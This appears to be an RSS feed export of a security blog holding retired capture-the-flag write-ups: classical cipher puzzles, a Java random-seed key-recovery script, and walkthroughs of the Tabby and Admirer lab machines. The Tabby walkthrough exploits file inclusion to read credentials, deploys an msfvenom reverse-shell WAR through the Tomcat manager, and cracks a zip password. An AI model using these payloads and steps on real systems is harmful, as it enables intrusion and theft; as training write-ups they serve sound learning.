@@ -1,0 +1,1459 @@
+<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0" xmlns:media="http://search.yahoo.com/mrss/"><channel><title><![CDATA[Inês Martins]]></title><description><![CDATA[Dev & Security]]></description><link>https://inesmartins.github.io//</link><image><url>https://inesmartins.github.io//favicon.png</url><title>Inês Martins</title><link>https://inesmartins.github.io//</link></image><generator>Ghost 3.18</generator><lastBuildDate>Sat, 05 Dec 2020 16:20:11 GMT</lastBuildDate><atom:link href="https://inesmartins.github.io//rss/" rel="self" type="application/rss+xml"/><ttl>60</ttl><item><title><![CDATA[HTB Crypto Challenge | Call]]></title><description><![CDATA[Write-up for retired HTB crypto challenge that involves DTFM and Prime Numbers Cipher.]]></description><link>https://inesmartins.github.io//htb-crypto-challenge-call/</link><guid isPermaLink="false">5eed049e1e7da103a083dca2</guid><category><![CDATA[crypto]]></category><category><![CDATA[dtfm]]></category><category><![CDATA[prime numbers]]></category><category><![CDATA[wav]]></category><category><![CDATA[htb]]></category><category><![CDATA[mp3]]></category><category><![CDATA[ffmpeg]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Sun, 22 Nov 2020 11:36:40 GMT</pubDate><media:content url="https://inesmartins.github.io//content/images/2020/11/66a3aDTMFpad.jpg" medium="image"/><content:encoded><![CDATA[<img src="https://inesmartins.github.io//content/images/2020/11/66a3aDTMFpad.jpg" alt="HTB Crypto Challenge | Call"><p>Banner source: <a href="https://en.wikipedia.org/wiki/Dual-tone_multi-frequency_signaling#/media/File:66a3aDTMFpad.jpg">https://en.wikipedia.org/wiki/Dual-tone_multi-frequency_signaling#/media/File:66a3aDTMFpad.jpg</a></p><blockquote>Hint: The flag format is: HTB{PASSWORD}</blockquote><p>We're given an audio file called <code>sound.mp3</code> that contains the very familiar sound of numbers being "dialled" on a phone aka <a href="https://en.wikipedia.org/wiki/Dual-tone_multi-frequency_signaling">DTFM (Dual-Tone Multi-Frequency Signaling)</a>.</p><p>I found an <a href="http://dialabc.com/sound/detect/index.html">online tool</a> and also a <a href="https://github.com/ribt/dtmf-decoder">Github project</a> that were able to accurately decode DTMF tones from an audio file, however, these tools only support <code>.wav</code> files so I started by converting the <code>.mp3</code> into <code>.wav</code> with <code>ffmpeg</code>. </p><!--kg-card-begin: markdown--><pre><code>$ ffmpeg -i sound.mp3 sound.wav
+</code></pre>
+<!--kg-card-end: markdown--><p>So here's the output:</p><!--kg-card-begin: markdown--><pre><code>2331434783711923431767372331117714113
+</code></pre>
+<!--kg-card-end: markdown--><p>Then I distributed the numbers in the same cadence as the keys were pressed in the audio file:</p><!--kg-card-begin: markdown--><pre><code>23 31 43 47 83 71 19 23 43 17 67 37 23 31 11 7 71 41 13
+</code></pre>
+<!--kg-card-end: markdown--><p>At this point I was stuck. <br>I spent a lot of time trying to find a cipher that would fit this sequence, but finally it was a tip from the <a href="https://forum.hackthebox.eu/discussion/1914/call-challenge/p1">forum</a> about looking for the "inherent mathematical properties" of these numbers that let me to realise <strong>that these are all prime numbers</strong>.</p><p>Finally, I used <a href="https://www.dcode.fr/prime-numbers-cipher">this</a> Prime Numbers Cipher decoder to get the flag:</p><!--kg-card-begin: markdown--><pre><code>HTB{IKNOWTHINGSLIKEDTMF}
+</code></pre>
+<!--kg-card-end: markdown-->]]></content:encoded></item><item><title><![CDATA[HTB Write-up | Tabby]]></title><description><![CDATA[Write-up for Tabby, a retired HTB machine.]]></description><link>https://inesmartins.github.io//dnp-htb-2/</link><guid isPermaLink="false">5efcd8e41e7da103a083e97f</guid><category><![CDATA[htb]]></category><category><![CDATA[tomcat]]></category><category><![CDATA[fcrackzip]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Sat, 07 Nov 2020 21:59:12 GMT</pubDate><media:content url="https://inesmartins.github.io//content/images/2020/07/Hack-The-Box----Tabby-2020-07-09-21-15-07.png" medium="image"/><content:encoded><![CDATA[<blockquote><em>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/259">here</a>.</em></blockquote><h2 id="scanning">Scanning</h2><pre><code>~ nmap -sC -sV -A -T4 tabby.htb
+
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-04 17:47 WEST
+Nmap scan report for tabby.htb (10.10.10.194)
+Host is up (0.30s latency).
+Not shown: 996 closed ports
+
+PORT     STATE    SERVICE  VERSION
+22/tcp   open     ssh      OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+80/tcp   open     http     Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Mega Hosting
+8080/tcp open     http     Apache Tomcat
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-title: Apache Tomcat
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 49.59 seconds</code></pre><h3 id="port-80">Port 80</h3><img src="https://inesmartins.github.io//content/images/2020/07/Hack-The-Box----Tabby-2020-07-09-21-15-07.png" alt="HTB Write-up | Tabby"><p>The Apache server running on port <code>80</code> seems to be the website for a hosting company called "Mega Hosting":</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/07/Mega-Hosting-2020-07-01-19-43-52-3.png" class="kg-image" alt="HTB Write-up | Tabby"></figure><p>The home page has a link for their "statement on recovering from the data breach". When we click the link we're redirected to <a href="http://megahosting.htb/news.php?file=statement">http://megahosting.htb/news.php?file=statement</a>. If we access the page on the <code>tabby.htb</code> domain (which we had previously configured on <code>/etc/hosts</code>) we see the following message:</p><pre><code>We apologise to all our customers for the previous data breach.
+
+We have changed the site to remove this tool, and have invested heavily in more secure servers</code></pre><p>So, from this statement we understand that a <em>tool </em>was removed from the site, which will probably be of use in the future.</p><p>Also very interesting is the way that the <code>statement</code> file is being fetched, let's see if we can fetch any file we want:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/07/VULNS.png" class="kg-image" alt="HTB Write-up | Tabby"></figure><p>Bingo! </p><h3 id="port-8080">Port 8080</h3><p>When we access port <code>8080</code> we see the "default Tomcat home page".</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/07/Apache-Tomcat-2020-07-01-19-45-46.png" class="kg-image" alt="HTB Write-up | Tabby"></figure><p>Since we've already identified a <a href="https://en.wikipedia.org/wiki/File_inclusion_vulnerability">Local File Inclusion vulnerability</a> on port <code>80</code>, the next logic step would be to try and access the credentials file on the server, however, this file was not in the typical location, in fact, it took me a couple of hours to find it hosted at <code>usr/share/tomcat9/etc/tomcat-users.xml</code>.</p><pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+...
+&lt;tomcat-users xmlns="http://tomcat.apache.org/xml"
+   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+   xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
+   version="1.0"&gt;
+ ...
+   &lt;role rolename="admin-gui"/&gt;
+   &lt;role rolename="manager-script"/&gt;
+   &lt;user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/&gt;
+&lt;/tomcat-users&gt;</code></pre><hr><h2 id="getting-user">Getting User</h2><p>As we can see above, <code>tomcat</code> has the following roles:</p><ul><li><code>admin-gui</code>: allows the user to access the host-manager's <a href="http://tabby.htb:8080/host-manager/html">graphical interface</a>;</li><li><code>manager-script</code>: allows the user to access the manager's <a href="http://tabby.htb:8080/manager/text/">text interface</a> and <a href="http://tabby.htb:8080/manager/status/all">server status</a>.</li></ul><p>The text interface is basically a <a href="https://tomcat.apache.org/tomcat-9.0-doc/host-manager-howto.html">REST API</a> that is able to execute some commands. Let's try to list all the applications running on this server:</p><pre><code>~ curl -u "tomcat" http://tabby.htb:8080/manager/text/list
+Enter host password for user 'tomcat': $3cureP4s5w0rd123!
+
+OK - Listed applications for virtual host [localhost]
+/:running:0:ROOT
+/examples:running:2:/usr/share/tomcat9-examples/examples
+/host-manager:running:1:/usr/share/tomcat9-admin/host-manager
+/shell:running:3:shell
+/my-shell2:running:10:my-shell2
+/siren.war:running:0:siren.war
+/my-shell4:running:1:my-shell4
+/manager:running:0:/usr/share/tomcat9-admin/manager
+/docs:running:0:/usr/share/tomcat9-docs/docs
+/my-shell:running:1:my-shell
+/my-shell1:running:2:my-shell1</code></pre><p>OK, as we can see a couple of other HTB users have clearly abused this feature, let's try to upload our own reverse shell using this interface:</p><pre><code>~ curl -T "./php-reverse-shell.php" "http://tabby.htb:8080/manager/text/deploy?path=/shelly&amp;update=true" -u tomcat
+Enter host password for user 'tomcat': $3cureP4s5w0rd123!
+
+FAIL - Deployed application at context path [/shelly] but context failed to start</code></pre><p>Turns out the shell was uploaded but since it's not a <code>.war</code> it's not run by the server. After searching how to embed a reverse shell in a <code>.war</code> file I came across <a href="https://www.hackingarticles.in/multiple-ways-to-exploit-tomcat-manager/">this</a> article that provided a bunch of different methods. This was the most effective:</p><pre><code>~ msfvenom -p java/jsp_shell_reverse_tcp LHOST=OUR_IP LPORT=4444 -f war &gt; shelly.war
+
+~ curl -T "./shelly.war" "http://tabby.htb:8080/manager/text/deploy?path=/shelly&amp;update=true" -u tomcat
+Enter host password for user 'tomcat': $3cureP4s5w0rd123!
+OK - Deployed application at context path [/shelly]</code></pre><p>Now when we access <code>http://tabby.htb:8080/shelly/</code> we get a reverse shell. <br>Let's upgrade it!</p><pre><code>~ /usr/bin/python3 -c 'import pty; pty.spawn("/bin/bash")'</code></pre><p>I tried authenticating with <code>su</code> as the user <code>ash</code> with the password we already know and also with  <code>clive</code>, which we found on the <code>/etc/passwd</code> file, but both failed.</p><h3 id="becoming-ash">Becoming ash</h3><p>I started by looking for files belonging to <code>ash</code>, which led me to an interesting zip file:</p><pre><code>tomcat@tabby:/var$ find ./ -user ash
+...
+./www/html/files
+./www/html/files/16162020_backup.zip</code></pre><p>The file was password protected and neither <code>clive</code> nor <code>$3cureP4s5w0rd123!</code> worked. In order to brute-force the answer I first <a href="https://inesmartins.github.io//how-to-dowload-files-from-reverse-shells-on-macos/">downloaded the file</a> to my machine and then used a zip file cracker - <code>fcrackzip</code> :</p><pre><code>kali@kali:~/$ fcrackzip -D -p rockyou.txt tabby.zip -u
+PASSWORD FOUND!!!!: pw == admin@it
+
+kali@kali:~/$ unzip tabby.zip 
+Archive:  tabby.zip
+[tabby.zip] var/www/html/favicon.ico password: 
+  inflating: var/www/html/favicon.ico  
+  inflating: var/www/html/index.php  
+ extracting: var/www/html/logo.png   
+  inflating: var/www/html/news.php   
+  inflating: var/www/html/Readme.txt
+</code></pre><p>Turns out there's nothing useful on this extracted folder, but the password can be use to login as <code>ash</code>:</p><pre><code>tomcat@tabby:/var/www/html$ su - ash
+su - ash
+Password: admin@it
+
+ash@tabby:~$ cat user.txt</code></pre><p>Finally, I SSHed into the machine after adding the public key to <code>/home/ash/.ssh/authorized_key</code>:</p><pre><code>ssh -i ash@tabby.htb</code></pre><hr><h2 id="getting-root">Getting root</h2><pre><code>ash@tabby:~$ ls
+alpine-v3.12-x86_64-20200710_0223.tar.gz  snap  user.txt</code></pre><p>Seeing the <code>alpine</code> zip file I realised the privilege escalation was probably be related to <code>lxd</code>. </p><p>I <a href="https://www.hackingarticles.in/lxd-privilege-escalation/">followed</a> this article and got the root flag.</p><hr>]]></content:encoded></item><item><title><![CDATA[ØxOPOSɆC | Underground Leaks (Crypto)]]></title><description><![CDATA[Write-up for retired Oposec's October challenge]]></description><link>https://inesmartins.github.io//oposec/</link><guid isPermaLink="false">5f89dd96b225522b040c4394</guid><category><![CDATA[crypto]]></category><category><![CDATA[java]]></category><category><![CDATA[ctf]]></category><category><![CDATA[oposec]]></category><category><![CDATA[random]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Tue, 27 Oct 2020 22:02:35 GMT</pubDate><media:content url="https://inesmartins.github.io//content/images/2020/10/highres_471963990-1-1.jpeg" medium="image"/><content:encoded><![CDATA[<pre><code>Rui Tinto admitted having some information about the snitch from the 0XOPOLEAKS. However, he's unwilling to give the passwords unless his demands of having Kripthor on 0xOPOSEC get fulfilled. 
+Meanwhile, government forces tried to crack the passwords with no success. 
+We know from underground sources that Rui Tinto does cipher each file individually for higher security and privacy. 
+We manage to put our hands on his top-notch closed source software used for encrypting the information.
+Leak: https://sefod.eu/oposec/underground_leaks.tar.gz</code></pre><img src="https://inesmartins.github.io//content/images/2020/10/highres_471963990-1-1.jpeg" alt="ØxOPOSɆC | Underground Leaks (Crypto)"><p>The tar contains a java executable and 3 files that look like ciphertexts:</p><pre><code>~ ls -la ./
+...
+-rw-r--r--   1 inesmartins  staff    32 Oct 16 11:09 1
+-rw-r--r--   1 inesmartins  staff    32 Oct 16 11:09 2
+-rw-r--r--   1 inesmartins  staff    32 Oct 16 11:09 3
+-rw-r--r--   1 inesmartins  staff  3992 Oct 16 10:38 HelloWorldApp.class</code></pre><pre><code>~ xxd 1
+00000000: ad42 207a 20db eb81 b536 25a0 865e 6778  .B z ....6%..^gx
+00000010: f23d 2a26 8e76 9970 6cfd 0673 2051 002b  .=*&amp;.v.pl..s Q.+
+
+~ xxd 2
+00000000: 2dcd cdcd a751 4e47 fd46 e8e0 8334 eade  -....QNG.F...4..
+00000010: 1796 e6e4 b25f 6f8d 5d47 f2b6 f688 38f7  ....._o.]G....8.
+
+~ xxd 3
+00000000: dada da4d 43e1 9595 3914 ca23 d84a df52  ...MC...9..#.J.R
+00000010: d897 0b06 89e7 773e 7f31 7dca 4a52 e2b7  ......w&gt;.1}.JR..</code></pre><p>It seems like this application encrypts a secret in a file that we provide:</p><pre><code>~ touch plaintext.txt
+~ java HelloWorldApp encode plaintext.txt
+Hey kid, do you have any leaks?
+tell me:
+this is my very secret secret
+Keep this key: E5F1F22FE01B9E10D17E3825ACE23799</code></pre><p>Once we have they key, we're then able to get the secret back using the same application:</p><pre><code>~ java HelloWorldApp decode plaintext.txt
+Please provide a key:
+E5F1F22FE01B9E10D17E3825ACE23799
+this is my very secret secret</code></pre><hr><h2 id="analysing-the-application">Analysing the application</h2><p>I started by decompiling the file using <a href="https://marketplace.visualstudio.com/publishers/tintinweb">tintinweb</a>:</p><pre><code class="language-java">import java.io.BufferedReader;
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.InputStreamReader;
+import java.util.Random;
+import javax.crypto.Cipher;
+import javax.crypto.spec.IvParameterSpec;
+import javax.crypto.spec.SecretKeySpec;
+
+class HelloWorldApp {
+  static String encryption_mode = "AES/CBC/PKCS5Padding";
+  
+  public static void main(String[] paramArrayOfString) {
+    if (paramArrayOfString.length == 2) {
+      if (paramArrayOfString[0].equals("decode")) {
+        decode(paramArrayOfString[1]);
+      } else if (paramArrayOfString[0].equals("encode")) {
+        encode(paramArrayOfString[1]);
+      } else {
+        System.out.print("encode|decode file_input|file_output");
+        System.exit(0);
+      } 
+    } else {
+      System.out.print("encode|decode file_input|file_output");
+      System.exit(0);
+    } 
+  }
+  
+  public static void encode(String paramString) {
+    Random random = new Random(5040508L);
+    int i = (new Random()).nextInt(1000000);
+    for (b = 0; b &lt; i; b++)
+      random.nextInt(256); 
+    try {
+      String str1 = "read text from input";
+      BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(System.in));
+      System.out.print("Hey kid, do you have any leaks?\ntell me:\n");
+      String str2 = bufferedReader.readLine();
+      str1 = "creating iv key";
+      byte[] arrayOfByte1 = new byte[16];
+      for (byte b1 = 0; b1 &lt; 16; b1++) {
+        int j = random.nextInt(256);
+        arrayOfByte1[b1] = (byte)j;
+      } 
+      str1 = "creating key";
+      byte[] arrayOfByte2 = new byte[16];
+      for (byte b2 = 0; b2 &lt; 16; b2++) {
+        int j = random.nextInt(256);
+        arrayOfByte2[b2] = (byte)j;
+      } 
+      str1 = "encrypting content";
+      byte[] arrayOfByte3 = encrypt(str2, arrayOfByte2, arrayOfByte1);
+      str1 = "write content to file";
+      FileOutputStream fileOutputStream = new FileOutputStream(paramString);
+      fileOutputStream.write(arrayOfByte1);
+      fileOutputStream.write(arrayOfByte3);
+      fileOutputStream.close();
+      System.out.print("Keep this key: ");
+      System.out.print(bytesToHex(arrayOfByte2));
+    } catch (Exception b) {
+      Exception exception;
+      exception.printStackTrace();
+    } 
+  }
+  
+  public static void decode(String paramString) {
+    String str = "read file, split iv and encrypted content and decode with the input key";
+    try {
+      File file = new File(paramString);
+      FileInputStream fileInputStream = new FileInputStream(file);
+      byte[] arrayOfByte1 = fileInputStream.readAllBytes();
+      byte[] arrayOfByte2 = new byte[16];
+      for (byte b = 0; b &lt; arrayOfByte2.length; b++)
+        arrayOfByte2[b] = arrayOfByte1[b]; 
+      System.out.print("Please provide a key:\n");
+      BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(System.in));
+      String str1 = bufferedReader.readLine();
+      byte[] arrayOfByte3 = hexStringToByteArray(str1);
+      byte[] arrayOfByte4 = new byte[arrayOfByte1.length - arrayOfByte2.length];
+      for (int i = arrayOfByte2.length; i &lt; arrayOfByte1.length; i++)
+        arrayOfByte4[i - arrayOfByte2.length] = arrayOfByte1[i]; 
+      String str2 = decrypt(arrayOfByte4, arrayOfByte3, arrayOfByte2);
+      System.out.print(str2);
+      System.out.print("\n");
+    } catch (Exception exception) {
+      exception.printStackTrace();
+    } 
+  }
+  
+  public static void noNeedToLookBelowThis() {}
+  
+  private static final char[] HEX_ARRAY = "0123456789ABCDEF".toCharArray();
+  
+  public static String bytesToHex(byte[] paramArrayOfByte) {
+    char[] arrayOfChar = new char[paramArrayOfByte.length * 2];
+    for (byte b = 0; b &lt; paramArrayOfByte.length; b++) {
+      byte b1 = paramArrayOfByte[b] &amp; 0xFF;
+      arrayOfChar[b * 2] = HEX_ARRAY[b1 &gt;&gt;&gt; 4];
+      arrayOfChar[b * 2 + 1] = HEX_ARRAY[b1 &amp; 0xF];
+    } 
+    return new String(arrayOfChar);
+  }
+  
+  public static byte[] hexStringToByteArray(String paramString) {
+    int i = paramString.length();
+    byte[] arrayOfByte = new byte[i / 2];
+    for (byte b = 0; b &lt; i; b += 2)
+      arrayOfByte[b / 2] = 
+        (byte)((Character.digit(paramString.charAt(b), 16) &lt;&lt; 4) + Character.digit(paramString.charAt(b + 1), 16)); 
+    return arrayOfByte;
+  }
+  
+  public static byte[] encrypt(String paramString, byte[] paramArrayOfByte1, byte[] paramArrayOfByte2) throws Exception {
+    Cipher cipher = Cipher.getInstance(encryption_mode);
+    SecretKeySpec secretKeySpec = new SecretKeySpec(paramArrayOfByte1, "AES");
+    cipher.init(1, secretKeySpec, new IvParameterSpec(paramArrayOfByte2));
+    return cipher.doFinal(paramString.getBytes());
+  }
+  
+  public static String decrypt(byte[] paramArrayOfByte1, byte[] paramArrayOfByte2, byte[] paramArrayOfByte3) throws Exception {
+    Cipher cipher = Cipher.getInstance(encryption_mode);
+    SecretKeySpec secretKeySpec = new SecretKeySpec(paramArrayOfByte2, "AES");
+    cipher.init(2, secretKeySpec, new IvParameterSpec(paramArrayOfByte3));
+    return new String(cipher.doFinal(paramArrayOfByte1));
+  }
+}
+</code></pre><p>The first thing that stood out was the <code>AES/CBC/PKCS5Padding</code> encryption mode, which is vulnerable to  <a href="https://en.wikipedia.org/wiki/Padding_oracle_attack">Padding oracle attacks</a>. However, after trying and failing to follow this route, I took a closer look at to the logic behind the random number generation:</p><pre><code class="language-java">public static void encode(String paramString) {
+    ...
+    Random random = new Random(5040508L);
+    int i = (new Random()).nextInt(1000000);
+    for (int b = 0; b &lt; i; b++) {
+    	random.nextInt(256);
+    }
+    ...
+    try {
+    
+    	byte[] iv = new byte[16];
+    	for (byte b1 = 0; b1 &lt; 16; b1++) {
+            int j = random.nextInt(256);
+            iv[b1] = (byte)j;
+    	}
+        
+        byte[] aeskey = new byte[16];
+    	for (byte b2 = 0; b2 &lt; 16; b2++) {
+            int j = random.nextInt(256);
+            aeskey[b2] = (byte)j;
+    	}
+        ...
+    }
+}</code></pre><p>It seems like:</p><ul><li>the random numbers are being generated using a <a href="https://docs.oracle.com/javase/8/docs/api/java/util/Random.html">Random</a> object (a Java pseudo-number generator), which is being initialised with a fixed seed: <code>5040508L</code>;</li><li>the AES key is being generated right after the IV.</li></ul><p>So, it's just a matter of brute-forcing the solution:</p><pre><code class="language-java">import java.util.Random;
+
+public class RandomBreaker {
+    
+    public static String iv = "bbbbbbded5a15b60b0d7fdfe922e53a5";
+    
+    public static void main(String[] args) {
+        byte[] ivData = hexStringToByteArray(iv);
+        Random random = new Random(5040508L);
+        for (int i = 0; i &lt; 1000000; i++) {
+            if (matchesNext16(random, ivData)) {
+                String keyHex = byteArrayToHexString(getNext16Bytes(random));
+                System.out.println(keyHex);
+                return;
+            }
+        }
+    }
+    
+    private static boolean matchesNext16(Random random, byte[] bytes) {
+        for (int i = 0; i &lt; bytes.length; i++) {
+            byte nextByte = (byte)random.nextInt(256);
+            if (nextByte != bytes[i]) {
+                return false;
+            }
+        }
+        return true;
+    }
+    
+    private static byte[] getNext16Bytes(Random random) {
+        byte[] bytes = new byte[16];
+        for (int i = 0; i &lt; 16; i++) {
+            bytes[i] = (byte)random.nextInt(256);
+        }
+        return bytes;
+    }
+    
+    private static String byteArrayToHexString(byte[] a) {
+        StringBuilder sb = new StringBuilder(a.length * 2);
+        for(byte b: a)
+            sb.append(String.format("%02x", b));
+        return sb.toString();
+    }
+    
+    private static byte[] hexStringToByteArray(String s) {
+        int len = s.length();
+        byte[] data = new byte[len / 2];
+        for (int i = 0; i &lt; len; i += 2) {
+            data[i / 2] = (byte) ((Character.digit(s.charAt(i), 16) &lt;&lt; 4) + Character.digit(s.charAt(i+1), 16));
+        }
+        return data;
+    }
+    
+}</code></pre><p>After repeating this process for all the 3 files, we get the flag: <code>flag{The_truth_is_out_there}</code>.</p><p>You can find the repository with the original challenge and the other solutions <a href="https://github.com/zezadas/0xOPOSEC_0x0D_PSEUDO_RANDOM">here</a>.</p>]]></content:encoded></item><item><title><![CDATA[HTB Crypto Challenge | Bank Heist]]></title><description><![CDATA[Write-up for retired HTB crypto challenge that involves Multi-tap code and Atbash Cipher.]]></description><link>https://inesmartins.github.io//htb-crypto-challenge/</link><guid isPermaLink="false">5eeba38b1e7da103a083dba9</guid><category><![CDATA[crypto]]></category><category><![CDATA[htb]]></category><category><![CDATA[multitap phone cipher]]></category><category><![CDATA[challenge]]></category><category><![CDATA[ctf]]></category><category><![CDATA[phone keypad]]></category><category><![CDATA[atbash]]></category><category><![CDATA[cryptography]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Thu, 22 Oct 2020 09:09:15 GMT</pubDate><media:content url="https://inesmartins.github.io//content/images/2020/10/heist-movies-on-netflix-866x487.jpg" medium="image"/><content:encoded><![CDATA[<blockquote><em>Hint: You get to the scene of a bank heist and find that you have caught one person. Under further analysis of the persons flip phone you see a message that seems suspicious. Can you figure out what the message to put this guy in jail?</em></blockquote><pre><code>444333 99966688 277733 7773323444664 84433 22244474433777, 99966688 277733 666552999. 99966688777 777744277733 666333 84433 443344477778 4447777 44466 99966688777 4466688777733. 84433 5533999 8666 84433 55566622255 4447777 22335556669. 4666 8666 727774447777.
+
+47777888 995559888 4555 47777888 44999988 666555997 : 8555444888477744488866888648833369!!</code></pre><img src="https://inesmartins.github.io//content/images/2020/10/heist-movies-on-netflix-866x487.jpg" alt="HTB Crypto Challenge | Bank Heist"><p>The number repetition is a dead giveaway for the <a href="https://en.wikipedia.org/wiki/Multi-tap">Multi-tap Cipher</a>, i.e.: the text you get when you use an older phone to create text messages. Luckily, there's <a href="https://www.dcode.fr/multitap-abc-cipher">an online tool</a> that automatically decodes this:</p><pre><code>IF YOU ARE READING THE CIPHER, YOU ARE OKAY.
+YOUR SHARE OF THE HEIST IS IN YOUR HOUSE.
+THE KEY TO THE LOCK IS BELOW.
+GO TO PARIS.
+GSV XLWV GL GSV HZU OLXP : TLIVGRIVNVMGUFMW!!</code></pre><p>So, it seems there's an additional cipher to crack:</p><pre><code>GSV XLWV GL GSV HZU OLXP : TLIVGRIVNVMGUFMW!!</code></pre><p><a href="https://scwf.dima.ninja/">Solve Crypto with Force!</a><em><strong> </strong></em>is an awesome website that immediately identified the cipher - <a href="https://en.wikipedia.org/wiki/Atbash">Atbash</a>:</p><pre><code>THE CODE TO THE SAF LOCK : GORETIREMENTFUND!!</code></pre><p>So, there's the flag: <code>HTB{GORETIREMENTFUND!!}</code>.</p>]]></content:encoded></item><item><title><![CDATA[HTB Write-up | Admirer]]></title><description><![CDATA[Write-up for Adminer, a retired HTB machine.]]></description><link>https://inesmartins.github.io//htb-write-up-admirer/</link><guid isPermaLink="false">5ede4cc8b6ef324dc7275dc8</guid><category><![CDATA[htb]]></category><category><![CDATA[ftp]]></category><category><![CDATA[adminer]]></category><category><![CDATA[mysql]]></category><category><![CDATA[privesc]]></category><category><![CDATA[python]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Thu, 22 Oct 2020 09:07:19 GMT</pubDate><media:content url="https://inesmartins.github.io//content/images/2020/10/admirer.png" medium="image"/><content:encoded><![CDATA[<img src="https://inesmartins.github.io//content/images/2020/10/admirer.png" alt="HTB Write-up | Admirer"><p><em>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/248">here</a>.</em></p><h2 id="scanning">Scanning</h2><p>As always, we start with some basic scanning, with tells us that the machine has:</p><ul><li>an <code>FTP</code> service (vsftp) running on port 21;</li><li>an <code>OpenSSH</code> service running on port 22;</li><li>an <code>Apache</code> web server running on port 80:</li></ul><!--kg-card-begin: markdown--><pre><code>~ nmap -sV -sC -A admirer.htb
+
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-08 15:37 WEST
+Nmap scan report for admirer.htb (10.10.10.187)
+Host is up (0.043s latency).
+Not shown: 997 closed ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
+| ssh-hostkey:
+|   2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 (RSA)
+|   256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 (ECDSA)
+|_  256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 (ED25519)
+80/tcp open  http    Apache httpd 2.4.25 ((Debian))
+| http-robots.txt: 1 disallowed entry
+|_/admin-dir
+|_http-server-header: Apache/2.4.25 (Debian)
+|_http-title: Admirer
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre>
+<!--kg-card-end: markdown--><p>The web application is just a very simple image gallery, there's no authentication or anything that immediately stands out, so we start by exploring the disallowed entry (<code>/admin-dir</code>) found during the scan.</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/main.png" class="kg-image" alt="HTB Write-up | Admirer"></figure><p>We can't directly access the admin-dir directory but the <a href="http://admirer.htb/robots.txt">robots.txt</a> file has a little clue left to us by "waldo":</p><!--kg-card-begin: markdown--><pre><code>User-agent: *
+
+# This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo
+Disallow: /admin-dir
+</code></pre>
+<!--kg-card-end: markdown--><p>With this small clue, we find 2 files:</p><ul><li><a href="http://admirer.htb/admin-dir/credentials.txt">http://admirer.htb/admin-dir/credentials.txt</a></li></ul><!--kg-card-begin: markdown--><pre><code>[Internal mail account]
+w.cooper@admirer.htb
+fgJr6q#S\W:$P
+
+[FTP account]
+ftpuser
+%n?4Wz}R$tTF7
+
+[Wordpress account]
+admin
+w0rdpr3ss01!
+</code></pre>
+<!--kg-card-end: markdown--><ul><li><a href="http://admirer.htb/admin-dir/contacts.txt">http://admirer.htb/admin-dir/contacts.txt</a>:</li></ul><!--kg-card-begin: markdown--><pre><code>##########
+# admins #
+##########
+# Penny
+Email: p.wise@admirer.htb
+
+##############
+# developers #
+##############
+# Rajesh
+Email: r.nayyar@admirer.htb
+# Amy
+Email: a.bialik@admirer.htb
+# Leonard
+Email: l.galecki@admirer.htb
+
+#############
+# designers #
+#############
+# Howard
+Email: h.helberg@admirer.htb
+# Bernadette
+Email: b.rauch@admirer.htb
+</code></pre>
+<!--kg-card-end: markdown--><p>Let's do a quick roundup of what we have so far:</p><ol><li>A list of users (with first name and email) that all seem to match the names of Big Bang Theory's characters (except Sheldon Cooper who is instead Waldo Cooper);</li><li>Credentials to one email account (w.cooper@admirer.htb);</li><li>Credentials to one FTP account (ftpuser);</li><li>Credentials to one Wordpress account (admin).</li></ol><p>Since we don't yet know of a way to access the email server or the Wordpress account, we try to explore the FTP service:</p><!--kg-card-begin: markdown--><pre><code>$ ftp 10.10.10.187
+
+Connected to 10.10.10.187.
+220 (vsFTPd 3.0.3)
+Name (10.10.10.187:kali): ftpuser
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+
+ftp&gt; pass
+Passive mode on.
+
+ftp&gt; ls
+227 Entering Passive Mode (10,10,10,187,175,74)
+150 Here comes the directory listing.
+-rw-r--r-- 1 0 0 3405 Dec 02 21:24 dump.sql
+-rw-r--r-- 1 0 0 5270987 Dec 03 21:20 html.tar.gz
+226 Directory send OK.
+
+</code></pre>
